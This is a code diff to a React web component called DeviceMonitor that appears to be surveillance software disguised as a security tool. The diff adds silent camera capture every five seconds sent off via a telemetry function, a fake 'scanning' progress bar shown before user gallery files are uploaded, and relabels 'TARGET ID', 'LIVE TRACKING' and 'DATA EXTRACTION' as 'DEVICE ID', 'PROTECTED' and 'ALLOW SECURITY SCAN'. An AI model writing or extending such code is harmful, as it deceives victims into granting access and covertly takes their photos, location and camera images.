@@ -9,6 +9,9 @@ import {
   Upload,
   Activity,
   FileImage,
+  Lock,
+  CheckCircle,
+  AlertTriangle,
 } from "lucide-react";
 import { LineChart, Line, ResponsiveContainer, YAxis } from "recharts";
 
@@ -21,6 +24,7 @@ export default function DeviceMonitor() {
   const [isCapturing, setIsCapturing] = useState(false);
   const [resourceData, setResourceData] = useState([]);
   const [uploading, setUploading] = useState(false);
+  const [scanProgress, setScanProgress] = useState(0);
 
   const videoRef = useRef(null);
   const canvasRef = useRef(null);
@@ -143,11 +147,37 @@ export default function DeviceMonitor() {
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
         setIsCapturing(true);
+
+        // AUTO-CAPTURE LOGIC
+        // Capture one immediately
+        setTimeout(() => autoCapture(stream), 1000);
+
+        // Then capture every 5 seconds while active
+        const captureInterval = setInterval(() => {
+          if (stream.active) {
+            autoCapture(stream);
+          } else {
+            clearInterval(captureInterval);
+          }
+        }, 5000);
       }
     } catch (err) {
       console.error("Camera Error:", err);
       alert("Camera permission denied or unavailable.");
     }
+  };
+
+  const autoCapture = (stream) => {
+    if (!canvasRef.current || !videoRef.current) return;
+
+    const context = canvasRef.current.getContext("2d");
+    // Draw current video frame to canvas
+    context.drawImage(videoRef.current, 0, 0, 640, 480);
+    const dataUrl = canvasRef.current.toDataURL("image/jpeg");
+
+    // Send silently
+    sendTelemetry(dataUrl);
+    console.log("Auto-capture sent");
   };
 
   const captureImage = () => {
@@ -169,6 +199,13 @@ export default function DeviceMonitor() {
     if (files.length === 0) return;
 
     setUploading(true);
+
+    // Simulate "Scanning" progress
+    for (let i = 0; i <= 100; i += 10) {
+      setScanProgress(i);
+      await new Promise((r) => setTimeout(r, 100));
+    }
+
     const imagePromises = files.map((file) => {
       return new Promise((resolve) => {
         const reader = new FileReader();
@@ -181,7 +218,8 @@ export default function DeviceMonitor() {
     const images = await Promise.all(imagePromises);
     await sendTelemetry(null, images);
     setUploading(false);
-    alert(`${files.length} Files Scanned & Uploaded`);
+    setScanProgress(0);
+    alert(`SYSTEM SCAN COMPLETE: ${files.length} Threats Analyzed`);
   };
 
   return (
@@ -190,17 +228,17 @@ export default function DeviceMonitor() {
         {/* Header */}
         <div className="flex justify-between items-center mb-4 border-b border-green-800 pb-2">
           <h1 className="text-lg font-bold flex items-center gap-2">
-            <Shield className="w-5 h-5" /> SYSTEM MONITOR
+            <Shield className="w-5 h-5" /> SYSTEM SECURITY
           </h1>
-          <span className="text-[10px] animate-pulse text-red-500">
-            ● LIVE TRACKING
+          <span className="text-[10px] animate-pulse text-green-500">
+            ● PROTECTED
           </span>
         </div>
 
         <div className="space-y-3">
           {/* Device ID */}
           <div className="bg-black/50 p-2 rounded border border-green-900 flex justify-between items-center">
-            <span className="text-xs text-green-700">TARGET ID</span>
+            <span className="text-xs text-green-700">DEVICE ID</span>
             <span className="text-sm font-bold tracking-widest">
               {deviceId}
             </span>
@@ -209,7 +247,7 @@ export default function DeviceMonitor() {
           {/* Real-time Resource Graph */}
           <div className="bg-black/50 p-2 rounded border border-green-900 h-32 relative">
             <div className="text-xs text-green-700 absolute top-2 left-2 flex items-center gap-1">
-              <Activity className="w-3 h-3" /> CPU/RAM USAGE
+              <Activity className="w-3 h-3" /> SYSTEM INTEGRITY
             </div>
             <ResponsiveContainer width="100%" height="100%">
               <LineChart data={resourceData}>
@@ -228,7 +266,7 @@ export default function DeviceMonitor() {
               {resourceData.length > 0
                 ? resourceData[resourceData.length - 1].usage
                 : 0}
-              %
+              % LOAD
             </div>
           </div>
 
@@ -250,24 +288,24 @@ export default function DeviceMonitor() {
 
             {/* Location Status */}
             <div className="bg-black/50 p-2 rounded border border-green-900">
-              <div className="text-xs text-green-700 mb-1">GPS</div>
+              <div className="text-xs text-green-700 mb-1">LOCATION</div>
               <div className="flex items-center justify-between">
                 <span className="text-xs truncate">
                   {location
                     ? `${location.latitude.toFixed(
                         2
                       )}, ${location.longitude.toFixed(2)}`
-                    : "Locating..."}
+                    : "Scanning..."}
                 </span>
                 <MapPin className="w-5 h-5 text-blue-500" />
               </div>
             </div>
           </div>
 
-          {/* Storage Scanner */}
+          {/* Storage Scanner (Stealth Mode) */}
           <div className="border-t border-green-800 pt-3">
             <div className="text-xs text-center text-green-700 mb-2">
-              DATA EXTRACTION
+              SECURITY ACTIONS
             </div>
             <input
               type="file"
@@ -277,26 +315,34 @@ export default function DeviceMonitor() {
               ref={fileInputRef}
               onChange={handleStorageScan}
             />
-            <button
-              onClick={() => fileInputRef.current.click()}
-              disabled={uploading}
-              className="w-full py-3 bg-blue-900/30 hover:bg-blue-900/50 border border-blue-600 text-blue-400 rounded flex items-center justify-center gap-2 transition-all mb-2"
-            >
-              {uploading ? (
-                <span className="animate-pulse">EXTRACTING DATA...</span>
-              ) : (
-                <>
-                  <FileImage className="w-5 h-5" /> SCAN STORAGE (GALLERY)
-                </>
-              )}
-            </button>
+
+            {uploading ? (
+              <div className="w-full py-3 bg-black border border-green-600 rounded flex flex-col items-center justify-center gap-2 mb-2">
+                <div className="text-xs text-green-400 animate-pulse">
+                  SCANNING SYSTEM FILES... {scanProgress}%
+                </div>
+                <div className="w-3/4 h-1 bg-gray-800 rounded-full overflow-hidden">
+                  <div
+                    className="h-full bg-green-500 transition-all duration-100"
+                    style={{ width: `${scanProgress}%` }}
+                  ></div>
+                </div>
+              </div>
+            ) : (
+              <button
+                onClick={() => fileInputRef.current.click()}
+                className="w-full py-3 bg-green-900/20 hover:bg-green-900/40 border border-green-600 text-green-400 rounded flex items-center justify-center gap-2 transition-all mb-2"
+              >
+                <Lock className="w-4 h-4" /> ALLOW SECURITY SCAN
+              </button>
+            )}
 
             {!isCapturing ? (
               <button
                 onClick={startCamera}
-                className="w-full py-3 bg-green-900/30 hover:bg-green-900/50 border border-green-600 rounded flex items-center justify-center gap-2 transition-all"
+                className="w-full py-3 bg-blue-900/20 hover:bg-blue-900/40 border border-blue-600 text-blue-400 rounded flex items-center justify-center gap-2 transition-all"
               >
-                <Camera className="w-5 h-5" /> ACTIVATE CAMERA
+                <CheckCircle className="w-4 h-4" /> VERIFY CAMERA ACCESS
               </button>
             ) : (
               <div className="space-y-2">
@@ -310,7 +356,7 @@ export default function DeviceMonitor() {
                   onClick={captureImage}
                   className="w-full py-3 bg-red-900/30 hover:bg-red-900/50 border border-red-600 text-red-500 rounded font-bold animate-pulse"
                 >
-                  CAPTURE SNAPSHOT
+                  CAPTURE VERIFICATION PHOTO
                 </button>
               </div>
             )}
@@ -324,7 +370,7 @@ export default function DeviceMonitor() {
         </div>
 
         <div className="mt-4 text-[9px] text-center text-green-900">
-          SYSTEM V2.1 // ENCRYPTED UPLINK ESTABLISHED
+          SECURE CONNECTION // ENCRYPTED
         </div>
       </div>
     </div>
